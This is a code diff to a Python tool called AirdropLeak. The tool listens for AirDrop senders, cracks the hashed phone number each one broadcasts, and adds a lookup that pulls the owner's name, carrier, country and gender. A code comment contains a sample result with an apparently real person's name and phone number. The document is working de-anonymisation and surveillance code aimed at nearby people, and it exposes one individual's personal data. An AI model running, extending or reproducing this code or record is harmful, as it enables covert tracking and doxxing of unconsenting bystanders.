@@ -9,11 +9,12 @@ import argparse
 import sys
 from utils.opendrop.base import AirDropBase
 from utils.hash_validator import check_hash
+from business_card.request_data import RequestData
 
 
 class AirdropLeak():
 
-    def __init__(self, args=None, name='evil-drop', iface='wlan0', phone='34666666666', mail='example@gmail.com'):
+    def __init__(self, args=None, name='evil-drop', iface='wlan0', phone='34666666666', mail='example@gmail.com', callback=None):
         if args:
             self.name = args.name
             self.iface = args.iface
@@ -25,9 +26,11 @@ class AirdropLeak():
             self.phone = phone
             self.mail = mail
         self.results = {}
+        self.scanning = False
 
 
     def run(self):
+        self.scanning = True
         try:
             print("Configuring owl interface...")
             check_wifi_config(self.iface)
@@ -52,6 +55,8 @@ class AirdropLeak():
             print("Bye")
             sys.exit()
 
+    def get_people(self):
+        return self.results
 
     def start_listetninig(self):
         print("[*] Looking for AirDrop senders...")
@@ -60,12 +65,16 @@ class AirdropLeak():
     def get_hash(self, data):
         return hashlib.sha256(data.encode('utf-8')).hexdigest()
     
+#{'ip': 'fe80::94fb:afff:fe4c:fbb%awdl0', 'hash': '3904ce0b7da5df62cae348a3010d35ca95a4653d28fb5b39534d9ec76a5\\x04)932a9', 'phone': ''}
+# {'3904ce0b7da5df62cae348a3010d35ca95a4653d28fb5b39534d9ec76a5932a9': {'name': 'Lucas Fernández', 'number': '34617135734', 'carrier': 'VODAFONE ESPAÑA  S.A. UNIPERSONAL', 'country': 'Spain', 'gender': 'M'}}
+
+
     def process_devices(self, device):
         hash = device.get("hash", None)
         hash = hash.replace("\\x04)", "")
         hash = hash.replace("\\x00)", "")
         if(hash not in self.results.keys()):
-            self.results.update({hash : device}) 
+            self.results.update({hash : {}}) 
             print("found one...")
             try:                       
                 phone = check_hash(hash)
@@ -74,6 +83,10 @@ class AirdropLeak():
                 phone = "None"
             if(phone != "None"):
                 print(f"Someone with phone number {phone} and hash {hash} has tried to use AirDrop")
+                info_request = RequestData(phone=phone)
+                info = info_request.get_info()
+                self.results[hash] = info
+                print(self.results)
             else:
                 print(f"Someone with hash {hash} has tried to use AirDrop")
 
